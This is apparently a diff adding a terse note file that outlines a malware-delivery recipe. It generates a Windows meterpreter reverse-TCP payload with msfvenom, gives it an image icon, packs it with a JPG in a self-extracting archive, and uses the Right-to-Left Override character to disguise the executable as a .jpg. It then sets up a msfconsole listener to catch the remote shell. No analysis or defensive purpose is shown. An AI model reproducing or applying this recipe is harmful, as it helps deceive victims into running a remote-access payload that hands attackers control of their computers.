@@ -1,0 +1,11 @@
+msfvenom -p windows/meterpreter/reverse_tcp 
+download image
+Quickany2 ico 
+convert it
+
+add to archive - setup option (name.exe and name.jpg)
+
+add gpj after name and RLO
+
+msfconsole 
+set payload, lhost, lport and then run.
